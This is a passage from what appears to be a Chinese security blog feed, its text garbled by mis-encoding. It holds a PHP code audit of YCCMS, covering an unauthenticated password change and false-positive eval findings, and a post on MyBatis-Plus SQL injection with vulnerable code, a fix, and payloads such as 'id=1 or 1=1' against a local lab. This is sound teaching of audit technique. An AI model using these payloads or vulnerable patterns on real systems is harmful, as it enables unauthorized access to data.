class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/admin.tpl&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;<br><br>&#125;<br><span class="hljs-comment">//ä¿®æ”¹å¯†ç </span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;ç”¨æˆ·åä¸èƒ½ä¸ºç©º&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;å¯†ç ä¸èƒ½ä¸ºç©º!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;ä¸¤æ¬¡å¯†ç ä¸ä¸€è‡´!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;å¯†ç ä¿®æ”¹æˆåŠŸ!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;å¯†ç æœªä¿®æ”¹!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç™»å½•åˆ°åå°é¡µé¢æ˜¯æœ‰é‰´æƒçš„ï¼Œä½†æ˜¯æ‰§è¡Œupdateæ–¹æ³•æ—¶å°±æ²¡æœ‰é‰´æƒäº†</p><p>åœ¨ç½‘ç«™æ‰¾åˆ°åŠŸèƒ½ç‚¹ï¼šå…¶ä»–åŠŸèƒ½-&gt;ä¿®æ”¹å¯†ç </p><p>æŠ“å–æ•°æ®åŒ…ï¼Œåœ¨æ•°æ®åŒ…ä¸­åšæ•°æ®çš„ä¿®æ”¹</p><p><img src="/img/yccms/yccms19.png" alt="å›¾ç‰‡"></p><p>ç½‘ç«™é€€å‡ºç™»å½•åå¯ä»¥æ­£å¸¸å‘é€æ•°æ®åŒ…</p><p>å°è¯•æ–°ç”¨æˆ·åå’Œå¯†ç åå‘ç°å¯ä»¥æ­£å¸¸ç™»å½•</p><h5 id="rce-Action-class-php-è¯¯æŠ¥"><a href="#rce-Action-class-php-è¯¯æŠ¥" class="headerlink" title="rce(Action.class.php)è¯¯æŠ¥"></a>rce(Action.class.php)è¯¯æŠ¥</h5><p>è·¯å¾„ï¼šcontroller&#x2F;Action.class.php</p><p>è°ƒç”¨evalå‡½æ•°ï¼Œå¯èƒ½å­˜åœ¨rceæ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<br><span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ©ç”¨ç‚¹æ—¶å‘ç°æ¯ä¸€ä¸ªcontrollerä¸­çš„æ–‡ä»¶éƒ½ç»§æ‰¿äº†æ­¤ç±»</p><p>æ„é€ payload(<a href="http://localhost/yccms/admin/?a=admin&m=phpinfo)%E5%8F%91%E7%8E%B0%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE">http://localhost/yccms/admin/?a=admin&amp;m=phpinfo)å‘ç°å¹¶æ²¡æœ‰å›æ˜¾</a></p><p>ä½¿ç”¨åŠ¨æ€è°ƒè¯•åå¯ä»¥çœ‹åˆ°mçš„å€¼åˆå§‹æ—¶ä¸ºphpinfo</p><p><img src="/img/yccms/yccms09.png" alt="å›¾ç‰‡"></p><p>ç»è¿‡run.inc.phpæ–¹æ³•ä¸­ä»£ç Factory::setAction()-&gt;run();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ä½¿ç”¨å·¥å‚æ¨¡å¼è°ƒç”¨æ§åˆ¶å™¨å¹¶æ‰§è¡Œå¯¹åº”æ–¹æ³•</span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br></code></pre></td></tr></table></figure><p>mçš„å€¼è¢«æ›¿æ¢ä¸ºmain</p><p>æŸ¥çœ‹setActionæ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¸­çš„å¯æ§å˜é‡æ˜¯a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤ä»£ç å¤§è‡´ä½œç”¨ï¼š</p><ol><li>è·å–è¯·æ±‚å‚æ•° <code>a</code> æ¥ç¡®å®šæ§åˆ¶å™¨ï¼›</li><li>è‹¥è¯·æ±‚çš„æ˜¯åå°æ§åˆ¶å™¨ï¼Œä¸”ç”¨æˆ·æœªç™»å½•ï¼Œåˆ™é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼›</li><li>è‹¥æ§åˆ¶å™¨ç±»æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ <code>LoginAction</code>ï¼›</li><li>åˆ›å»ºæ§åˆ¶å™¨ç±»çš„å¯¹è±¡ï¼Œå¹¶è¿”å›</li></ol><p>æ‰€ä»¥æ— æ³•è°ƒç”¨ä¼ å…¥çš„æ§åˆ¶å™¨å†…ä¸å­˜åœ¨çš„æ–¹æ³•</p><p>å­˜åœ¨evalå‡½æ•°çš„æ–¹æ³•æ˜¯runæ–¹æ³•ï¼Œåƒå¦ä¸€ä¸ªæˆåŠŸæ‰§è¡Œçš„rceæ¼æ´ä¸€æ ·æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/yccms/admin/?a=action&amp;m=run();phpinfo();//../#<br></code></pre></td></tr></table></figure><p>ä»ç„¶æ— æ³•æ³¨å…¥æˆåŠŸ</p><p>å¯ä»¥çœ‹åˆ°åœ¨æ­¥å…¥run.inc.phpåï¼Œmçš„å€¼å˜ä¸ºmain</p><h5 id="æ–‡ä»¶åŒ…å«-run-inc-php-è¯¯æŠ¥"><a href="#æ–‡ä»¶åŒ…å«-run-inc-php-è¯¯æŠ¥" class="headerlink" title="æ–‡ä»¶åŒ…å«(run.inc.php)è¯¯æŠ¥"></a>æ–‡ä»¶åŒ…å«(run.inc.php)è¯¯æŠ¥</h5><p>å·¥å…·å®¡è®¡æ—¶å‘ç°äº†requireå…³é”®å­—ï¼Œå¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p>ä½†æ˜¯requireå‡½æ•°å†…æ— å¯æ§å˜é‡ï¼Œæ— æ³•åˆ©ç”¨æ­¤å‡½æ•°</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><ol><li><p>è‡ªåŠ¨åŒ–å·¥å…·ä¸€èˆ¬æ˜¯ç›´æ¥æœç´¢å…³é”®å­—æˆ–æ•æ„Ÿå‡½æ•°ï¼Œè¯¯æŠ¥å¾ˆå¤š</p></li><li><p>æ‰¾æ¼æ´å…³é”®è¦çœ‹æ¼æ´ç‚¹å’Œåˆ©ç”¨ç‚¹ï¼Œæœ‰å…¥å£èƒ½åˆ©ç”¨æ‰ç®—æ¼æ´</p></li><li><p>å¯»æ‰¾æ•æ„Ÿå‡½æ•°å’Œå¯æ§å˜é‡ï¼ŒæŸ¥çœ‹å˜é‡æœ‰æ— è¿‡æ»¤ï¼Œè¿‡æ»¤æ˜¯å¦å¯ç»•è¿‡</p></li><li><p>cmsæ¼æ´ï¼š</p><ul><li>é‰´æƒå¤„ç†ä¸åˆ°ä½ï¼Œå¤§éƒ¨åˆ†æ“ä½œéƒ½æ²¡æœ‰é‰´æƒï¼Œæ— éœ€ç™»å½•å°±å¯æ“ä½œ</li></ul><p>â€‹       ä¿®å¤å»ºè®®ï¼šå†™å‡ºå•ç‹¬çš„é‰´æƒæ–‡ä»¶ï¼Œåœ¨æ¯ä¸ªç±»ä¸­å¼•ç”¨</p><ul><li>è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¹æ–‡ä»¶ååŠæ–‡ä»¶è·¯å¾„å‡ ä¹æ— è¿‡æ»¤</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>phpä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CMS</tag>
      
      <tag>phpä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaä»£ç å®¡è®¡ä¸­çš„sqlæ³¨å…¥2.0</title>
    <link href="/2025/06/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A52.0/"/>
    <url>/2025/06/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A52.0/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaä»£ç å®¡è®¡ä¸­çš„sqlæ³¨å…¥2-0"><a href="#Javaä»£ç å®¡è®¡ä¸­çš„sqlæ³¨å…¥2-0" class="headerlink" title="Javaä»£ç å®¡è®¡ä¸­çš„sqlæ³¨å…¥2.0"></a>Javaä»£ç å®¡è®¡ä¸­çš„sqlæ³¨å…¥2.0</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://drun1baby.top/2022/09/14/Java-OWASP-%E4%B8%AD%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E6%80%BB%E7%BB%93-JDBC-%E6%98%93%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E7%82%B9">Java OWASP ä¸­çš„ SQL æ³¨å…¥ä»£ç å®¡è®¡ | Drunkbabyâ€™s Blog (drun1baby.top)</a></p><p><a href="https://xz.aliyun.com/news/11118">JAVAå¸¸ç”¨æ¡†æ¶SQLæ³¨å…¥å®¡è®¡-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_38170796/article/details/135398819">é¢„ç¼–è¯‘çœŸçš„èƒ½å®Œç¾é˜²å¾¡SQLæ³¨å…¥å—ï¼Ÿ_é¢„ç¼–è¯‘èƒ½å®Œå…¨é˜²æ­¢sqlæ³¨å…¥å—-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/m0_63299495/article/details/145633163">ã€MyBatisã€‘é¢„ç¼–è¯‘SQLä¸å³æ—¶SQL_mybatis sqlé¢„å¤„ç†-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/weixin_45537947/article/details/111399311">MyBatis-Pluså¿«é€Ÿå…¥é—¨-(å¹²è´§æ»¡æ»¡+è¶…è¯¦ç»†)_mybatis-plus å…¥é—¨-CSDNåšå®¢</a></p><h2 id="Mybatis-Plus-çš„-SQL-æ³¨å…¥æ¢è®¨"><a href="#Mybatis-Plus-çš„-SQL-æ³¨å…¥æ¢è®¨" class="headerlink" title="Mybatis-Plus çš„ SQL æ³¨å…¥æ¢è®¨"></a>Mybatis-Plus çš„ SQL æ³¨å…¥æ¢è®¨</h2><h3 id="ä½¿ç”¨applyç›´æ¥æ‹¼æ¥sqlè¯­å¥"><a href="#ä½¿ç”¨applyç›´æ¥æ‹¼æ¥sqlè¯­å¥" class="headerlink" title="ä½¿ç”¨applyç›´æ¥æ‹¼æ¥sqlè¯­å¥"></a>ä½¿ç”¨applyç›´æ¥æ‹¼æ¥sqlè¯­å¥</h3><h4 id="å®é™…çš„applyåœºæ™¯"><a href="#å®é™…çš„applyåœºæ™¯" class="headerlink" title="å®é™…çš„applyåœºæ™¯"></a>å®é™…çš„applyåœºæ™¯</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å°†æ­¤æ–¹æ³•ç»‘å®šåˆ° HTTP è¯·æ±‚è·¯å¾„ /mybatis_plus/mpVuln01</span><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln01&quot;)</span>  <br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªæ§åˆ¶å™¨æ–¹æ³•ï¼Œæ¥æ”¶ä¸¤ä¸ªå‚æ•° name å’Œ idï¼Œå¹¶è¿”å›ä¸€ä¸ª Employee å¯¹è±¡</span><br><span class="hljs-keyword">public</span> Employee <span class="hljs-title function_">mpVuln01</span><span class="hljs-params">(String name, String id)</span> &#123;  <br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæŸ¥è¯¢æ¡ä»¶æ„é€ å™¨</span><br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br>    <span class="hljs-comment">// æ·»åŠ ç­‰å€¼æŸ¥è¯¢æ¡ä»¶ï¼šWHERE name = #&#123;name&#125;</span><br>    wrapper.eq(<span class="hljs-string">&quot;name&quot;</span>, name);  <br>    <span class="hljs-comment">// ç›´æ¥æ‹¼æ¥ SQL ç‰‡æ®µï¼Œå˜æˆï¼šAND id=xxxï¼ˆå­˜åœ¨ SQL æ³¨å…¥é£é™©ï¼‰</span><br>    wrapper.apply(<span class="hljs-string">&quot;id=&quot;</span> + id);  <br>    <span class="hljs-comment">// æ‰§è¡ŒæŸ¥è¯¢ï¼Œåªè¿”å›ä¸€æ¡ç¬¦åˆæ¡ä»¶çš„è®°å½•</span><br>    <span class="hljs-type">Employee</span> <span class="hljs-variable">employee</span> <span class="hljs-operator">=</span> employeeMapper.selectOne(wrapper);  <br>    <span class="hljs-comment">// è¿”å›æŸ¥è¯¢ç»“æœ</span><br>    <span class="hljs-keyword">return</span> employee;  <br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥çœ‹åˆ°è¿™é‡Œçš„å‚æ•°ä¼ å…¥æ˜¯ç›´æ¥æ‹¼æ¥çš„ï¼Œå­˜åœ¨sqlæ³¨å…¥æ¼æ´</p><p>ä½†æ˜¯ç”±äºselectOneå‡½æ•°çš„å­˜åœ¨(åªè¿”å›ä¸€æ¡ç¬¦åˆæ¡ä»¶çš„è®°å½•)ï¼Œè¿™é‡Œåªèƒ½è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œä¸‡èƒ½å¯†ç ä¼šè¿”å›å…¨éƒ¨æ•°æ®ï¼Œç”±äºç‰¹æ®Šå‡½æ•°é™åˆ¶ï¼Œæ— æ³•æ³¨å…¥æˆåŠŸ</p><h4 id="applyåœºæ™¯çš„é˜²æŠ¤"><a href="#applyåœºæ™¯çš„é˜²æŠ¤" class="headerlink" title="applyåœºæ™¯çš„é˜²æŠ¤"></a>applyåœºæ™¯çš„é˜²æŠ¤</h4><p>åœ¨è¯­å¥ååŠ ä¸Šå‚æ•°å ä½ç¬¦{0}å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpSec02&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpSec02</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.apply(<span class="hljs-string">&quot;id=&#123;0&#125;&quot;</span>,id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="lastæ–¹æ³•äº§ç”Ÿçš„sqlæ³¨å…¥"><a href="#lastæ–¹æ³•äº§ç”Ÿçš„sqlæ³¨å…¥" class="headerlink" title="lastæ–¹æ³•äº§ç”Ÿçš„sqlæ³¨å…¥"></a>lastæ–¹æ³•äº§ç”Ÿçš„sqlæ³¨å…¥</h3><p>last()æ–¹æ³•é‡å†™åæœ‰ä¸¤ä¸ªæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">last(String lastSql)<br>last(<span class="hljs-type">boolean</span> condition, String lastSql)<br></code></pre></td></tr></table></figure><p>æ­¤æ–¹æ³•ä¸­lastSqlå¯ä»¥ç›´æ¥ç”¨æ¥ç¼–å†™SQLè¯­å¥ï¼Œå†™ä¸€ä¸ªæ–°æ¥å£</p><p>çŒœæµ‹å®æˆ˜é»‘ç›’åˆ©ç”¨åœºæ™¯ä¸ºåœ¨çº¿sqlè¯­å¥æ‰§è¡Œç¨‹åºï¼Œå¯ä»¥ç¼–å†™æ–°æ¥å£è¿›è¡Œæ¸—é€</p><p>è¿™é‡Œç›´æ¥ä½¿ç”¨Drunkbabyå¸ˆå‚…çš„æ¼æ´ç¯å¢ƒ</p><p>é¡¹ç›®åœ°å€ï¼š[JavaSecurityLearning&#x2F;JavaSecurity&#x2F;Java ä»£ç å®¡è®¡&#x2F;CodeReview&#x2F;JavaSec-Code&#x2F;MybatisPluSqli at main Â· Drun1baby&#x2F;JavaSecurityLearning (github.com)](<a href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java</a> ä»£ç å®¡è®¡&#x2F;CodeReview&#x2F;JavaSec-Code&#x2F;MybatisPluSqli)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/last&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln03</span><span class="hljs-params">( String id)</span> &#123;<br>        QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();<br>        wrapper.last(<span class="hljs-string">&quot;order by &quot;</span> + id);<br>        <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯åŠ¨ç¯å¢ƒæ—¶å‡ºç°æŠ¥é”™</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A501.png" alt="å›¾ç‰‡"></p><p>åœ¨MybatisPluSqliApplication.javaæ–‡ä»¶åŠ ä¸Šä¸€è¡Œä»£ç å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MapperScan(&quot;com.drunkbaby.mapper&quot;)</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶å…¨éƒ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.drunkbaby;<br><br><span class="hljs-keyword">import</span> org.mybatis.spring.annotation.MapperScan;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-meta">@MapperScan(&quot;com.drunkbaby.mapper&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPluSqliApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MybatisPluSqliApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>å®æ“åå‘ç°ä¸éœ€è¦payloadä¹Ÿæ˜¯ç›´æ¥çˆ†å‡ºæ‰€æœ‰æ•°æ®çš„</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A502.png" alt="å›¾ç‰‡"></p><p>å¯èƒ½æ˜¯æˆ‘çš„æ“ä½œå‡ºäº†ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯æœ¬æ¥æ§åˆ¶ä»£ç å°±ä¸æ˜¯å¾ˆå¤šï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯æ²¡æœ‰é—®é¢˜çš„</p><p>æ­£å¸¸payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8081/mybatis_plus/last?id=1%20or%201=1<br></code></pre></td></tr></table></figure><h4 id="order-byç›¸å…³çš„sqlæ³¨å…¥"><a href="#order-byç›¸å…³çš„sqlæ³¨å…¥" class="headerlink" title="order byç›¸å…³çš„sqlæ³¨å…¥"></a>order byç›¸å…³çš„sqlæ³¨å…¥</h4><p>åˆšå¼€å§‹æƒ³è¦æ­è¿™ä¸ªç¯å¢ƒçš„ä¸»è¦åŸå› æ˜¯æ²¡è§è¿‡order byåæ‹¼æ¥ä¸‡èƒ½å¯†ç çš„</p><p>å†æ¬¡å¤ä¹ äº†ä¸€ä¸‹order byç›¸å…³</p><p>åœ¨ SQL ä¸­ï¼Œ<code>ORDER BY</code> å­å¥ç”¨äºå¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åºã€‚<code>ORDER BY</code> åçš„å‚æ•°æœ‰ä»¥ä¸‹è¦æ±‚å’Œæ³¨æ„äº‹é¡¹ï¼š</p><ol><li>åˆ—åæˆ–åˆ«å</li></ol><ul><li><p>å¯ä»¥ä½¿ç”¨è¡¨ä¸­çš„åˆ—åæˆ–æŸ¥è¯¢ä¸­å®šä¹‰çš„åˆ—åˆ«åã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age;<br></code></pre></td></tr></table></figure></li></ul><ol 